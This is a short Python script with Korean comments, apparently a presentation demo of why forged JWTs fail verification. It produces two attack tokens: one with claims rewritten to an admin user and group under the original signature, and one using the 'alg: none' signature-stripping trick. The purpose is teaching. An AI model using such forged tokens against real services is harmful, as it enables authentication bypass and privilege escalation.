#!/usr/bin/env python3
"""토큰을 일부러 망가뜨린다.

덱에서 "그래서 어떻게 막히는가" 를 보이려고 쓴다.

두 가지 손질만 한다.

    tamper_jwt.py <토큰>              내용을 고치고 서명은 그대로 둔다
    tamper_jwt.py --alg-none <토큰>  alg 를 none 으로 바꾸고 서명을 뗀다

둘 다 공격자가 실제로 해 보는 짓이다. 첫째는 "내용만 고치면 되지 않나",
둘째는 "서명을 안 하면 확인할 것도 없지 않나" — 그 둘이 왜 안 통하는지가
4부의 요점이다. 여기서 만든 토큰을 jwtool verify 에 넣어 보면
답이 나온다.
"""
import base64
import json
import sys


def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64e(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def main(argv):
    alg_none = False
    args = [a for a in argv[1:] if a != "--alg-none"]
    if len(args) != len(argv) - 1:
        alg_none = True
    if len(args) != 1:
        sys.exit(__doc__)

    head, body, sig = args[0].split(".")

    if alg_none:
        # 서명을 아예 떼어 낸다. 옛 라이브러리들이 이걸 통과시켰다.
        return print(b64e(b'{"alg":"none"}') + "." + body + ".")

    # 내용만 고친다. 서명은 원래 것을 그대로 붙여 둔다 —
    # 고친 내용으로는 저 서명을 다시 만들 수 없기 때문이다.
    claims = json.loads(b64d(body))
    claims["preferred_username"] = "admin.lee"
    claims["groups"] = ["lunch-users", "lunch-admins"]
    packed = json.dumps(claims, ensure_ascii=False,
                        separators=(",", ":")).encode()
    print(head + "." + b64e(packed) + "." + sig)


if __name__ == "__main__":
    main(sys.argv)
